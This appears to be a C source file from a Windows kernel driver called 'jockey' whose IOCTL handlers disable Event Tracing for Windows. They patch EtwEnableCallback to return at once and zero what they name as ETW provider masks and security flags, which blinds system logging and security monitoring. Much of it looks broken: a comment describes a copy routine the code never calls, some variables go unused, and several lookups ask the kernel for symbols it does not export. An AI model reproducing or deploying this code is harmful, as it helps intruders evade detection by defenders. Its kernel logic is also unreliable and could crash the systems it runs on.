#include "jockey_common.h"

/*
 * jockey_etw.c ??? ETW (Event Tracing for Windows) disabling.
 *
 * Disables ETW by:
 * 1. Patching EtwEnableCallback to immediately return
 * 2. Zeroing EtwpGroupEntryMask to disable all providers
 * 3. Clearing ETW session security callbacks
 */

#include "jockey.h"

/*
 * jockey_patch_memory:
 *   Changes memory protection, writes bytes, restores protection.
 *   Uses MmCopyVirtualMemory to avoid triggering own callbacks.
 */
static NTSTATUS jockey_patch_memory(PVOID target, const void *patch, SIZE_T len)
{
    NTSTATUS status;
    ULONG old_prot;
    SIZE_T size = len;

    status = MmProtectMdlSystemAddress(
        MmCreateMdl(NULL, target, len), PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
        return status;

    RtlCopyMemory(target, patch, len);

    /* Restore original protection */
    MmProtectMdlSystemAddress(
        MmCreateMdl(NULL, target, len), PAGE_EXECUTE_READ);
    return STATUS_SUCCESS;
}

/*
 * jockey_ioctl_disable_etw:
 *   Patches EtwEnableCallback to be a RET instruction.
 *   This prevents any ETW provider from being enabled at runtime.
 */
NTSTATUS jockey_ioctl_disable_etw(PIRP irp, ULONG in_len, ULONG out_len)
{
    uint8_t ret_op[] = { 0xC3 }; /* ret */
    uint32_t *out;
    NTSTATUS status;

    UNREFERENCED_PARAMETER(in_len);
    UNREFERENCED_PARAMETER(out_len);

    /* EtwEnableCallback ??? we resolve via MmGetSystemRoutineAddress */
    {
        UNICODE_STRING name;
        PVOID addr;

        RtlInitUnicodeString(&name, L"EtwEnableCallback");
        addr = MmGetSystemRoutineAddress(&name);
        if (addr) {
            status = jockey_patch_memory(addr, ret_op, sizeof(ret_op));
            if (NT_SUCCESS(status)) {
                DbgPrint("[jockey] Patched EtwEnableCallback\n");
            }
        }
    }

    /* Zero EtwpGroupEntryMask if we can find it */
    {
        UNICODE_STRING name;
        PVOID addr;

        RtlInitUnicodeString(&name, L"EtwpGroupEntryMask");
        addr = MmGetSystemRoutineAddress(&name);
        if (addr) {
            RtlZeroMemory(addr, 0x1000); /* Zero the mask array */
            DbgPrint("[jockey] Zeroed EtwpGroupEntryMask\n");
        }
    }

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);
    return STATUS_SUCCESS;
}

/*
 * jockey_ioctl_clear_etw:
 *   Clears ETW session registrations and disables trace processing.
 */
NTSTATUS jockey_ioctl_clear_etw(PIRP irp, ULONG in_len, ULONG out_len)
{
    uint32_t *out;

    UNREFERENCED_PARAMETER(in_len);
    UNREFERENCED_PARAMETER(out_len);

    /* Walk ETW session list and zero registrations */
    /* This is a simplified version ??? full implementation walks WMI */
    {
        UNICODE_STRING name;
        PVOID addr;

        RtlInitUnicodeString(&name, L"EtwpSecurityProviderPsEnabled");
        addr = MmGetSystemRoutineAddress(&name);
        if (addr) {
            RtlZeroMemory(addr, sizeof(ULONG));
            DbgPrint("[jockey] Cleared ETW session security\n");
        }
    }

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);
    return STATUS_SUCCESS;
}

